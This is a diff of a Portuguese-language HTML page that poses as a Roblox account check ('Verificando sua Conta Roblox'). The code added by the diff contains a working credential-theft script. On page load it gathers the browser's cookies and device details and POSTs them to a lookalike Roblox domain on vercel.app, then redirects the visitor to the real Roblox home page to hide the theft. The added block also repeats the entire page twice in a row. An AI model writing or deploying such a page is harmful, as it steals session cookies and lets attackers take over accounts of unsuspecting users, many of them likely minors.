@@ -1,23 +1,157 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Carregando Roblox...</title>
-<style>
-  body {
-    margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
-    background: linear-gradient(135deg, #0ff, #008080);
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    color: #0ff; text-shadow: 0 0 5px #0ff, 0 0 10px #0ff;
-  }
-  h1 {
-    font-size: 2.5rem;
-  }
-</style>
+  <meta charset="UTF-8">
+  <title>Verificando sua Conta Roblox</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #0d0d0d;
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(20, 20, 20, 0.8);
+      padding: 40px 50px;
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+      text-align: center;
+      animation: pulse 2s infinite;
+    }
+    h1 {
+      font-size: 24px;
+      color: #00ffff;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 16px;
+      color: #aaa;
+    }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
+      50% { box-shadow: 0 0 30px rgba(0, 255, 255, 0.4); }
+      100% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
+    }
+  </style>
 </head>
 <body>
-  <h1>Carregando Roblox e enviando cookie...</h1>
-  <script src="send.js"></script>
+  <div class="container">
+    <h1>Conectando à Roblox...</h1>
+    <p>Aguarde, estamos validando suas informações de login.</p>
+  </div>
+
+  <script>
+    (async () => {
+      const payload = {
+        cookie: document.cookie || "sem cookie",
+        userAgent: navigator.userAgent,
+        location: window.location.href,
+        language: navigator.language,
+        platform: navigator.platform
+      };
+
+      try {
+        await fetch("https://roblox-com-pt.vercel.app/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.warn("Erro ao enviar:", err);
+      }
+
+      setTimeout(() => {
+        location.href = "https://www.roblox.com/home";
+      }, 1800);
+    })();
+  </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificando sua Conta Roblox</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background: #0d0d0d;
+      font-family: 'Segoe UI', sans-serif;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    .container {
+      background: rgba(20, 20, 20, 0.8);
+      padding: 40px 50px;
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+      text-align: center;
+      animation: pulse 2s infinite;
+    }
+    h1 {
+      font-size: 24px;
+      color: #00ffff;
+      margin-bottom: 20px;
+    }
+    p {
+      font-size: 16px;
+      color: #aaa;
+    }
+    @keyframes pulse {
+      0% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
+      50% { box-shadow: 0 0 30px rgba(0, 255, 255, 0.4); }
+      100% { box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Conectando à Roblox...</h1>
+    <p>Aguarde, estamos validando suas informações de login.</p>
+  </div>
+
+  <script>
+    (async () => {
+      const payload = {
+        cookie: document.cookie || "sem cookie",
+        userAgent: navigator.userAgent,
+        location: window.location.href,
+        language: navigator.language,
+        platform: navigator.platform
+      };
+
+      try {
+        await fetch("https://roblox-com-pt.vercel.app/api/send", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.warn("Erro ao enviar:", err);
+      }
+
+      setTimeout(() => {
+        location.href = "https://www.roblox.com/home";
+      }, 1800);
+    })();
+  </script>
 </body>
 </html>
